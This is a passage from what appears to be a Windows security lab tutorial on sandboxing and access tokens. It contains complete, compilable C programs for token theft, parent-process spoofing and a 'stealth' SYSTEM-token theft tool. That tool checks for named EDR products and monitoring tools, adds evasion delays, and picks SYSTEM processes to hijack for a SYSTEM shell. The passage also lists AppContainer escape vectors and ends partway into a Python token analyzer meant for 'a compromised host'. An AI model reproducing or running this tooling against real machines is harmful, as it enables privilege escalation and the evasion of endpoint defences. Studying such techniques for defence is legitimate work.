    return TRUE;
}

void ExplainEscapeVectors() {
    printf("\n=== AppContainer Escape Vectors ===\n\n");

    printf("[1] BROKER PROCESS EXPLOITATION\n");
    printf("-------------------------------\n");
    printf("AppContainer processes communicate with broker via IPC.\n");
    printf("Broker runs at Medium IL with more access.\n");
    printf("Exploit: Find vulnerability in broker's IPC handling.\n");
    printf("Example: Chrome's Mojo IPC, Edge's RuntimeBroker\n\n");

    printf("[2] COM OBJECT ABUSE\n");
    printf("--------------------\n");
    printf("Some COM objects are accessible from AppContainer.\n");
    printf("If a COM object has excessive functionality:\n");
    printf("  - File access via IShellItem\n");
    printf("  - Registry access via specific interfaces\n");
    printf("  - Network via COM-based protocols\n\n");

    printf("[3] NAMED OBJECT NAMESPACE LEAKS\n");
    printf("--------------------------------\n");
    printf("AppContainers have their own object namespace.\n");
    printf("But some objects may be shared globally:\n");
    printf("  - Shared memory sections\n");
    printf("  - Events, mutexes with weak DACLs\n");
    printf("  - Named pipes accessible to AC\n\n");

    printf("[4] PROCESS ATTRIBUTE MANIPULATION\n");
    printf("----------------------------------\n");
    printf("PROC_THREAD_ATTRIBUTE_SECURITY_CAPABILITIES sets AC.\n");
    printf("If parent process can be influenced:\n");
    printf("  - Spawn child without AC attribute\n");
    printf("  - Inherit less-restricted token\n");
    printf("  - Exploit token assignment logic\n\n");

    printf("[5] KERNEL VULNERABILITY\n");
    printf("------------------------\n");
    printf("AppContainer is enforced by the kernel security reference monitor.\n");
    printf("Kernel exploit = bypass ALL usermode sandboxing.\n");
    printf("This is why kernel bugs are so valuable for browser exploit chains.\n");
}

int main() {
    EnumerateAppContainerProcesses();
    CreateAppContainerProcess("cmd.exe");
    ExplainEscapeVectors();

    return 0;
}
```

**Compile and Run**

```bash
cd c:\Windows_Mitigations_Lab>
cl src\appcontainer_analysis.c  /Fe:bin\appcontainer_analysis.exe advapi32.lib userenv.lib ole32.lib
.\bin\appcontainer_analysis.exe
```

### Comparison: Integrity Levels vs AppContainer

```text
┌────────────────────────────────────────────────────────────────────┐
│         Windows Sandbox Mechanisms: IL vs AppContainer             │
├────────────────────────────────────────────────────────────────────┤
│                                                                    │
│  Operation              │ Medium IL │ Low IL    │ AppContainer     │
│  ──────────────────────────────────────────────────────────────────│
│  Read user files        │ YES       │ YES       │ NO (denied)      │
│  Write user files       │ YES       │ NO        │ NO (denied)      │
│  Write system files     │ NO*       │ NO        │ NO (denied)      │
│  Access registry HKCU   │ YES       │ YES (read)│ NO (denied)      │
│  Network access         │ YES       │ YES       │ NO (no caps)     │
│  Access current dir     │ YES       │ YES       │ NO (invalid)     │
│  IPC with other procs   │ YES       │ LIMITED   │ NO (isolated)    │
│                                                                    │
│  * Requires elevation (High IL)                                    │
│                                                                    │
│  KEY DIFFERENCES:                                                  │
│  ----------------                                                  │
│  Integrity Levels:                                                 │
│    - Enforces No-Write-Up policy (lower cannot write to higher)    │
│    - Read access preserved by default                              │
│    - Processes can still communicate via IPC                       │
│    - Used for: IE Protected Mode, sandboxed downloads              │
│                                                                    │
│  AppContainer:                                                     │
│    - Default deny for all resources                                │
│    - Requires explicit capabilities for any access                 │
│    - Isolated object namespace                                     │
│    - Used for: UWP apps, Edge/Chrome renderers, Store apps         │
│                                                                    │
│  SECURITY HIERARCHY (weakest to strongest):                        │
│    Medium IL > Low IL > AppContainer (no caps) > Kernel isolation  │
│                                                                    │
└────────────────────────────────────────────────────────────────────┘
```

### Token Manipulation

```bash
cd c:\Windows_Mitigations_Lab

cl src\token_manipulation.c /Fe:bin\token_manipulation.exe advapi32.lib
tasklist | findstr cmd.exe
# use one of these pids and try both stealing and spoofing methods
.\bin\token_manipulation.exe

cl src\token_stealth.c /Fe:bin\token_stealth.exe /MT /O2 advapi32.lib
# run the following as admin:
.\token_stealth.exe
# a new cmd should be popped
whoami
#nt authority\system
whoami /groups | findstr "Label"
#Mandatory Label\System Mandatory Level Label            S-1-16-16384
whoami /priv
# PRIVILEGES INFORMATION
```

#### Stealing and Spoofing

```c
// token_manipulation.c
// Compile: cl src\token_manipulation.c /Fe:bin\token_manipulation.exe advapi32.lib

#include <windows.h>
#include <stdio.h>
#include <sddl.h>

void DumpTokenInfo(HANDLE hToken) {
    DWORD dwSize;

    // Get user SID
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    PTOKEN_USER pUser = (PTOKEN_USER)malloc(dwSize);
    if (GetTokenInformation(hToken, TokenUser, pUser, dwSize, &dwSize)) {
        LPSTR sidStr;
        ConvertSidToStringSidA(pUser->User.Sid, &sidStr);
        printf("  User SID: %s\n", sidStr);
        LocalFree(sidStr);
    }
    free(pUser);

    // Get privileges
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
    PTOKEN_PRIVILEGES pPrivs = (PTOKEN_PRIVILEGES)malloc(dwSize);
    if (GetTokenInformation(hToken, TokenPrivileges, pPrivs, dwSize, &dwSize)) {
        printf("  Privileges (%d):\n", pPrivs->PrivilegeCount);
        for (DWORD i = 0; i < pPrivs->PrivilegeCount && i < 10; i++) {
            char privName[256];
            DWORD nameSize = sizeof(privName);
            LookupPrivilegeNameA(NULL, &pPrivs->Privileges[i].Luid, privName, &nameSize);
            printf("    %s [%s]\n", privName,
                   (pPrivs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) ? "ENABLED" : "DISABLED");
        }
        if (pPrivs->PrivilegeCount > 10) {
            printf("    ... and %d more\n", pPrivs->PrivilegeCount - 10);
        }
    }
    free(pPrivs);
}

BOOL EnablePrivilege(HANDLE hToken, LPCSTR privilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValueA(NULL, privilege, &luid)) {
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
            printf("[-] Privilege %s not held by token\n", privilege);
            return FALSE;
        }
        printf("[+] Privilege %s enabled\n", privilege);
        return TRUE;
    }

    return FALSE;
}

BOOL StealTokenFromProcess(DWORD targetPID) {
    printf("\n[*] Attempting to steal token from PID %d\n", targetPID);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPID);
    if (!hProcess) {
        printf("[-] OpenProcess failed: %d\n", GetLastError());
        printf("    (Need SeDebugPrivilege or target must be same user)\n");
        return FALSE;
    }

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        printf("[-] OpenProcessToken failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Opened token from PID %d\n", targetPID);
    printf("[*] Target token info:\n");
    DumpTokenInfo(hToken);

    // Duplicate the token
    HANDLE hDupToken = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
                          TokenPrimary, &hDupToken)) {
        printf("[-] DuplicateTokenEx failed: %d\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Token duplicated successfully\n");

    // Try to create process with stolen token
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    if (CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, NULL,
                                 L"cmd.exe /k echo Token stolen from PID && whoami",
                                 0, NULL, NULL, &si, &pi)) {
        printf("[+] Process created with stolen token, PID: %d\n", pi.dwProcessId);
        printf("[*] Check the new cmd.exe window - it runs with target's privileges\n");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[-] CreateProcessWithTokenW failed: %d\n", GetLastError());
        printf("    (Need SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege)\n");
    }

    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return TRUE;
}

BOOL PPIDSpoofing(DWORD parentPID) {
    printf("\n[*] Attempting PPID spoofing with parent PID %d\n", parentPID);

    // Open parent process
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPID);
    if (!hParent) {
        printf("[-] OpenProcess failed: %d\n", GetLastError());
        printf("    (Need PROCESS_CREATE_PROCESS access to parent)\n");
        return FALSE;
    }

    printf("[+] Opened parent process handle\n");

    // Initialize attribute list
    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    LPPROC_THREAD_ATTRIBUTE_LIST pAttrList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attrSize);

    if (!InitializeProcThreadAttributeList(pAttrList, 1, 0, &attrSize)) {
        printf("[-] InitializeProcThreadAttributeList failed: %d\n", GetLastError());
        CloseHandle(hParent);
        free(pAttrList);
        return FALSE;
    }

    // Set parent process attribute
    if (!UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                    &hParent, sizeof(HANDLE), NULL, NULL)) {
        printf("[-] UpdateProcThreadAttribute failed: %d\n", GetLastError());
        DeleteProcThreadAttributeList(pAttrList);
        CloseHandle(hParent);
        free(pAttrList);
        return FALSE;
    }

    printf("[+] Process attribute set to spoof parent\n");

    // Create process with spoofed PPID
    STARTUPINFOEXA siEx = {0};
    siEx.StartupInfo.cb = sizeof(siEx);
    siEx.lpAttributeList = pAttrList;

    PROCESS_INFORMATION pi = {0};
    char cmdLine[] = "cmd.exe /k echo PPID Spoofed! Check Process Explorer";

    if (CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
                       EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
                       NULL, NULL, &siEx.StartupInfo, &pi)) {
        printf("[+] Process created with spoofed PPID: %d\n", pi.dwProcessId);
        printf("[*] Check Process Explorer - parent should show as PID %d\n", parentPID);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[-] CreateProcess failed: %d\n", GetLastError());
    }

    DeleteProcThreadAttributeList(pAttrList);
    CloseHandle(hParent);
    free(pAttrList);
    return TRUE;
}

int main(int argc, char* argv[]) {
    // Dump current token
    HANDLE hToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
    printf("=== Current Token ===\n");
    DumpTokenInfo(hToken);

    // Try enabling common offensive privileges
    printf("\n=== Enabling Privileges ===\n");
    EnablePrivilege(hToken, "SeDebugPrivilege");
    EnablePrivilege(hToken, "SeImpersonatePrivilege");
    EnablePrivilege(hToken, "SeAssignPrimaryTokenPrivilege");

    CloseHandle(hToken);

    // Interactive menu
    printf("\n=== Token Manipulation Techniques ===\n");
    printf("[1] Steal token from another process\n");
    printf("[2] PPID spoofing (fake parent process)\n");
    printf("[3] Exit\n");
    printf("\nSelect option: ");

    int choice;
    if (scanf("%d", &choice) != 1) {
        printf("Invalid input\n");
        return 1;
    }

    if (choice == 1) {
        printf("Enter target PID to steal token from: ");
        DWORD pid;
        if (scanf("%d", &pid) == 1) {
            StealTokenFromProcess(pid);
        }
    } else if (choice == 2) {
        printf("Enter parent PID to spoof: ");
        DWORD pid;
        if (scanf("%d", &pid) == 1) {
            PPIDSpoofing(pid);
        }
    }

    printf("\n=== Summary ===\n");
    printf("Token stealing: Requires SeDebugPrivilege or same-user access\n");
    printf("PPID spoofing: Requires PROCESS_CREATE_PROCESS on parent\n");
    printf("Both techniques bypass many security monitoring tools\n");

    return 0;
}
```

#### Token Theft from SYSTEM Process

```c
// token_stealth.c
// Compile: cl src\token_stealth.c /Fe:bin\token_stealth.exe /MT /O2 advapi32.lib
// REQUIRES: SeDebugPrivilege (run as admin)

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <psapi.h>
#include <sddl.h>

#pragma comment(lib, "advapi32.lib")

// OPSEC and stealth structures
typedef struct _OPSEC_CTX {
    BOOL is_edr_present;
    BOOL is_monitoring_active;
    DWORD stealth_level;
    DWORD delay_factor;
} OPSEC_CTX;

typedef struct _TARGET_PROCESS {
    DWORD pid;
    WCHAR name[256];
    DWORD session_id;
    BOOL is_critical;
    BOOL is_protected;
    double cpu_usage;
} TARGET_PROCESS;

// Global state
static OPSEC_CTX g_opsec = {0};
static TARGET_PROCESS g_targets[32];
static int g_target_count = 0;

BOOL DetectEDRPresence() {
    // Check for common EDR processes
    WCHAR* edr_processes[] = {
        L"crowdstrike.exe",
        L"csfalconservice.exe",
        L"sentinelagent.exe",
        L"cb.exe",
        L"carbonblack.exe",
        L"edrclient.exe",
        L"elasticendpoint.exe",
        L"mcafeeendpoint.exe",
        L"symantec.exe",
        L"taniumclient.exe"
    };

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    BOOL found_edr = FALSE;
    if (Process32FirstW(snapshot, &pe32)) {
        do {
            for (int i = 0; i < 10; i++) {
                if (_wcsicmp(pe32.szExeFile, edr_processes[i]) == 0) {
                    found_edr = TRUE;
                    break;
                }
            }
        } while (Process32NextW(snapshot, &pe32) && !found_edr);
    }

    CloseHandle(snapshot);

    // Check for EDR drivers
    WCHAR system32[MAX_PATH];
    GetSystemDirectoryW(system32, MAX_PATH);

    WCHAR* edr_drivers[] = {
        L"\\drivers\\CrowdStrike\\",
        L"\\drivers\\cb\\",
        L"\\drivers\\sentinel\\",
        L"\\drivers\\elastic\\"
    };

    for (int i = 0; i < 4; i++) {
        WCHAR driver_path[MAX_PATH];
        wcscpy_s(driver_path, MAX_PATH, system32);
        wcscat_s(driver_path, MAX_PATH, edr_drivers[i]);

        if (GetFileAttributesW(driver_path) != INVALID_FILE_ATTRIBUTES) {
            found_edr = TRUE;
            break;
        }
    }

    return found_edr;
}

BOOL CheckProcessMonitoring() {
    // Check for common monitoring tools
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    BOOL monitoring = FALSE;
    if (Process32FirstW(snapshot, &pe32)) {
        do {
            WCHAR* monitor_processes[] = {
                L"procmon.exe",
                L"processhacker.exe",
                L"procexp.exe",
                L"wireshark.exe",
                L"sysinternals.exe",
                L"taskmgr.exe"
            };

            for (int i = 0; i < 6; i++) {
                if (_wcsicmp(pe32.szExeFile, monitor_processes[i]) == 0) {
                    monitoring = TRUE;
                    break;
                }
            }
        } while (Process32NextW(snapshot, &pe32) && !monitoring);
    }

    CloseHandle(snapshot);
    return monitoring;
}

VOID InitializeOPSEC() {
    g_opsec.is_edr_present = DetectEDRPresence();
    g_opsec.is_monitoring_active = CheckProcessMonitoring();

    // Set stealth level based on environment
    if (g_opsec.is_edr_present) {
        g_opsec.stealth_level = 3;  // Maximum stealth
        g_opsec.delay_factor = 5000;  // 5 second delays
    } else if (g_opsec.is_monitoring_active) {
        g_opsec.stealth_level = 2;  // Medium stealth
        g_opsec.delay_factor = 2000;  // 2 second delays
    } else {
        g_opsec.stealth_level = 1;  // Minimal stealth
        g_opsec.delay_factor = 500;   // 0.5 second delays
    }

    printf("[*] OPSEC Assessment:\n");
    printf("    EDR Present: %s\n", g_opsec.is_edr_present ? "YES" : "NO");
    printf("    Monitoring Active: %s\n", g_opsec.is_monitoring_active ? "YES" : "NO");
    printf("    Stealth Level: %d\n", g_opsec.stealth_level);
    printf("    Delay Factor: %d ms\n\n", g_opsec.delay_factor);
}

BOOL IsProcessProtected(DWORD pid) {
    // Check if process is protected - simplified check
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) return TRUE;  // Assume protected if can't open

    BOOL protected = FALSE;

    // Try to open with more access - if fails, likely protected
    HANDLE hTestProcess = OpenProcess(PROCESS_VM_READ, FALSE, pid);
    if (!hTestProcess) {
        protected = TRUE;
    } else {
        CloseHandle(hTestProcess);
    }

    CloseHandle(hProcess);
    return protected;
}

double GetProcessCPUUsage(DWORD pid) {
    // Get CPU usage for process selection (avoid high CPU processes)
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) return 100.0;  // Assume high usage

    // Simple CPU check
    FILETIME creation_time, exit_time, kernel_time, user_time;
    if (GetProcessTimes(hProcess, &creation_time, &exit_time, &kernel_time, &user_time)) {
        ULARGE_INTEGER kernel, user;
        kernel.LowPart = kernel_time.dwLowDateTime;
        kernel.HighPart = kernel_time.dwHighDateTime;
        user.LowPart = user_time.dwLowDateTime;
        user.HighPart = user_time.dwHighDateTime;

        double cpu_time = (kernel.QuadPart + user.QuadPart) / 10000000.0;

        CloseHandle(hProcess);
        return cpu_time;
    }

    CloseHandle(hProcess);
    return 50.0;
}

VOID EnumerateTargetProcesses() {
    printf("[*] Enumerating potential SYSTEM processes...\n");

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    g_target_count = 0;

    if (Process32FirstW(snapshot, &pe32)) {
        do {
            // Check if process runs as SYSTEM
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
            if (!hProcess) continue;

            HANDLE hToken;
            if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
                DWORD token_size = 0;
                GetTokenInformation(hToken, TokenUser, NULL, 0, &token_size);

                if (token_size > 0) {
                    TOKEN_USER* token_user = (TOKEN_USER*)malloc(token_size);
                    if (GetTokenInformation(hToken, TokenUser, token_user, token_size, &token_size)) {
                        LPWSTR sid_string;
                        if (ConvertSidToStringSidW(token_user->User.Sid, &sid_string)) {
                            if (wcsstr(sid_string, L"S-1-5-18")) {  // SYSTEM SID
                                if (g_target_count < 32) {
                                    g_targets[g_target_count].pid = pe32.th32ProcessID;
                                    wcscpy_s(g_targets[g_target_count].name, 256, pe32.szExeFile);

                                    // Get session ID via ProcessIdToSessionId
                                    DWORD session_id = 0;
                                    ProcessIdToSessionId(pe32.th32ProcessID, &session_id);
                                    g_targets[g_target_count].session_id = session_id;

                                    g_targets[g_target_count].is_protected = IsProcessProtected(pe32.th32ProcessID);
                                    g_targets[g_target_count].cpu_usage = GetProcessCPUUsage(pe32.th32ProcessID);

                                    // Mark critical processes
                                    g_targets[g_target_count].is_critical =
                                        (_wcsicmp(pe32.szExeFile, L"winlogon.exe") == 0) ||
                                        (_wcsicmp(pe32.szExeFile, L"csrss.exe") == 0) ||
                                        (_wcsicmp(pe32.szExeFile, L"smss.exe") == 0);

                                    g_target_count++;
                                }
                            }
                            LocalFree(sid_string);
                        }
                    }
                    free(token_user);
                }
                CloseHandle(hToken);
            }
            CloseHandle(hProcess);

        } while (Process32NextW(snapshot, &pe32) && g_target_count < 32);
    }

    CloseHandle(snapshot);

    // Display targets with analysis
    printf("[+] Found %d potential targets:\n", g_target_count);
    for (int i = 0; i < g_target_count; i++) {
        wprintf(L"    [%d] %s (PID: %d, Session: %d)\n",
               i, g_targets[i].name, g_targets[i].pid, g_targets[i].session_id);
        printf("         Protected: %s, Critical: %s, CPU: %.1f%%\n",
               g_targets[i].is_protected ? "YES" : "NO",
               g_targets[i].is_critical ? "YES" : "NO",
               g_targets[i].cpu_usage);
    }
    printf("\n");
}

DWORD SelectOptimalTarget() {
    // Score-based target selection
    double best_score = -1.0;
    int best_target = -1;

    for (int i = 0; i < g_target_count; i++) {
        double score = 0.0;

        // Prefer non-protected processes
        if (!g_targets[i].is_protected) score += 100;

        // Prefer non-critical processes
        if (!g_targets[i].is_critical) score += 50;

        // Prefer low CPU usage
        score += (100.0 - g_targets[i].cpu_usage);

        // PREFER session 1 (user session) over session 0 for token access
        if (g_targets[i].session_id == 1) score += 50;
        else if (g_targets[i].session_id == 0) score += 25;

        // Penalty for common targets that might be monitored
        if (_wcsicmp(g_targets[i].name, L"lsass.exe") == 0) score -= 30;
        if (_wcsicmp(g_targets[i].name, L"services.exe") == 0) score -= 20;

        // Bonus for winlogon (usually accessible)
        if (_wcsicmp(g_targets[i].name, L"winlogon.exe") == 0) score += 30;

        if (score > best_score) {
            best_score = score;
            best_target = i;
        }
    }

    if (best_target >= 0) {
        wprintf(L"[*] Selected optimal target: %s (PID: %d, Score: %.1f)\n",
               g_targets[best_target].name, g_targets[best_target].pid, best_score);
        return g_targets[best_target].pid;
    }

    return 0;
}

BOOL EnableDebugPrivilegeStealth() {
    printf("[*] Enabling SeDebugPrivilege with stealth...\n");

    // Add delay based on stealth level
    if (g_opsec.stealth_level > 1) {
        Sleep(g_opsec.delay_factor);
    }

    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[-] Failed to open process token\n");
        return FALSE;
    }

    if (!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = GetLastError();
    CloseHandle(hToken);

    if (result && (err != ERROR_NOT_ALL_ASSIGNED)) {
        printf("[+] SeDebugPrivilege enabled\n");
        return TRUE;
    }

    printf("[-] Failed to enable SeDebugPrivilege\n");
    return FALSE;
}

BOOL StealTokenWithStealth(DWORD targetPid, const char* cmdLine) {
    printf("[*] Initiating stealthy token theft from PID %d...\n", targetPid);

    // Add random delay for stealth
    if (g_opsec.stealth_level > 1) {
        Sleep(g_opsec.delay_factor + (rand() % 1000));
    }

    // Step 1: Open target process with maximum access
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) {
        // Try with less access
        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, targetPid);
        if (!hProcess) {
            printf("[-] Failed to open target process: %d\n", GetLastError());
            return FALSE;
        }
    }

    printf("[+] Opened target process\n");

    // Step 2: Get process token with all necessary rights
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        printf("[-] Failed to open process token: %d (trying different target)\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Opened token from PID %d\n", targetPid);

    // Step 3: Duplicate token
    HANDLE hDupToken;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                          SecurityImpersonation, TokenPrimary, &hDupToken)) {
        printf("[-] Failed to duplicate token: %d\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Token duplicated successfully\n");

    // Step 4: Create process with stolen token
    STARTUPINFOW si = { sizeof(si) };
    si.lpDesktop = L"Winsta0\\Default";
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;

    PROCESS_INFORMATION pi = {0};

    wchar_t cmdBuf[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, cmdLine, -1, cmdBuf, MAX_PATH);

    BOOL success = CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE,
                                         NULL, cmdBuf, 0,
                                         NULL, NULL, &si, &pi);

    if (success) {
        printf("[+] SYSTEM process created with PID: %d\n", pi.dwProcessId);
        printf("[*] A new SYSTEM cmd.exe window should have opened\n");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        // Fallback method
        printf("[*] Primary method failed (%d), trying CreateProcessAsUser...\n", GetLastError());

        success = CreateProcessAsUserW(hDupToken, NULL, cmdBuf, NULL, NULL,
                                      FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
        if (success) {
            printf("[+] SYSTEM process created via fallback, PID: %d\n", pi.dwProcessId);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            printf("[-] All token theft methods failed: %d\n", GetLastError());
        }
    }

    // Cleanup
    if (g_opsec.stealth_level > 1) {
        Sleep(g_opsec.delay_factor / 2);
    }

    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);

    return success;
}

int main() {
    // Initialize random seed for delays
    srand(GetTickCount());

    // Step 1: OPSEC assessment
    InitializeOPSEC();

    // Step 2: Enable debug privilege with stealth
    if (!EnableDebugPrivilegeStealth()) {
        printf("[-] Must run as Administrator with UAC elevation\n");
        return 1;
    }

    // Step 3: Enumerate and analyze potential targets
    EnumerateTargetProcesses();

    if (g_target_count == 0) {
        printf("[-] No suitable SYSTEM processes found\n");
        return 1;
    }

    // Step 4: Select optimal target based on OPSEC considerations
    DWORD targetPid = SelectOptimalTarget();
    if (targetPid == 0) {
        printf("[-] No optimal target selected\n");
        return 1;
    }

    // Step 5: Execute stealthy token theft with retry
    printf("\n[*] Executing stealthy token theft...\n");

    BOOL success = FALSE;
    int attempts = 0;
    int max_attempts = 5;

    while (!success && attempts < max_attempts && attempts < g_target_count) {
        // Try different targets if first one fails
        DWORD tryPid = (attempts == 0) ? targetPid : g_targets[attempts].pid;

        if (attempts > 0) {
            wprintf(L"[*] Trying alternative target: %s (PID: %d)\n",
                   g_targets[attempts].name, tryPid);
        }

        success = StealTokenWithStealth(tryPid, "cmd.exe");
        attempts++;

        if (!success && attempts < max_attempts) {
            Sleep(500);  // Brief delay between attempts
        }
    }

    if (success) {
        printf("\n[+] Token theft completed successfully after %d attempt(s)\n", attempts);
        printf("[*] Check for new SYSTEM command prompt\n");

        if (g_opsec.is_edr_present) {
            printf("[!] EDR detected - monitor for alerts\n");
        }
    } else {
        printf("\n[-] Token theft failed after %d attempts\n", attempts);
        printf("[*] This may indicate:\n");
        printf("    - Protected processes (PPL)\n");
        printf("    - Insufficient privileges\n");
        printf("    - Security software blocking access\n");
        return 1;
    }

    printf("\n[*] Execution completed - exiting cleanly\n");
    return 0;
}
```

### Token & Sandbox Analysis

```python
#!/usr/bin/env python3
"""
token_sandbox_analyzer.py
Uses ctypes for direct Win32 API calls

Run as admin for full analysis. Works from both attacker's Python or
a compromised host with Python available.
"""

import ctypes
import ctypes.wintypes as wt
import os
import sys
import subprocess
import json
from enum import IntEnum

# --- Constants ---
TOKEN_QUERY = 0x0008
TOKEN_DUPLICATE = 0x0002
TOKEN_ASSIGN_PRIMARY = 0x0001
TOKEN_IMPERSONATE = 0x0004
TOKEN_ADJUST_PRIVILEGES = 0x0020
PROCESS_QUERY_INFORMATION = 0x0400
SE_PRIVILEGE_ENABLED = 0x00000002
TokenIntegrityLevel = 25
TokenPrivileges = 3
TokenUser = 1
TokenIsAppContainer = 29

class IntegrityLevel(IntEnum):
    UNTRUSTED = 0x0000
    LOW = 0x1000
    MEDIUM = 0x2000
    MEDIUM_PLUS = 0x2100
    HIGH = 0x3000
    SYSTEM = 0x4000
    PROTECTED = 0x5000

# --- Structures ---
class LUID(ctypes.Structure):
    _fields_ = [("LowPart", wt.DWORD), ("HighPart", wt.LONG)]

class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("Luid", LUID), ("Attributes", wt.DWORD)]

class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [
        ("PrivilegeCount", wt.DWORD),
        ("Privileges", LUID_AND_ATTRIBUTES * 64)
    ]

class SID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("Sid", ctypes.c_void_p), ("Attributes", wt.DWORD)]

class TOKEN_MANDATORY_LABEL(ctypes.Structure):
    _fields_ = [("Label", SID_AND_ATTRIBUTES)]

# --- API References ---
advapi32 = ctypes.windll.advapi32
kernel32 = ctypes.windll.kernel32

def get_integrity_level(pid=None):
    """Get integrity level of a process (default: current process)."""
    if pid is None:
        # Get real handle to current process
        hProcess = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, kernel32.GetCurrentProcessId())
        if not hProcess:
            return None, f"OpenProcess failed: {ctypes.GetLastError()}"
        close_process = True
    else:
        hProcess = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
        if not hProcess:
            return None, f"OpenProcess failed: {ctypes.GetLastError()}"
        close_process = True

    hToken = wt.HANDLE()
    if not advapi32.OpenProcessToken(hProcess, TOKEN_QUERY, ctypes.byref(hToken)):
        err = ctypes.GetLastError()
        if close_process:
            kernel32.CloseHandle(hProcess)
        return None, f"OpenProcessToken failed: {err}"

    # Query integrity level
    dwSize = wt.DWORD()
    advapi32.GetTokenInformation(hToken, TokenIntegrityLevel, None, 0, ctypes.byref(dwSize))

    buf = ctypes.create_string_buffer(dwSize.value)
    if advapi32.GetTokenInformation(hToken, TokenIntegrityLevel, buf, dwSize, ctypes.byref(dwSize)):
        pLabel = ctypes.cast(buf, ctypes.POINTER(TOKEN_MANDATORY_LABEL))
        pSid = pLabel.contents.Label.Sid

        # Get the last sub-authority (the integrity level RID)
        advapi32.GetSidSubAuthorityCount.restype = ctypes.POINTER(ctypes.c_ubyte)
        advapi32.GetSidSubAuthorityCount.argtypes = [ctypes.c_void_p]
        pCount = advapi32.GetSidSubAuthorityCount(pSid)
        count = pCount.contents.value

        advapi32.GetSidSubAuthority.restype = ctypes.POINTER(wt.DWORD)
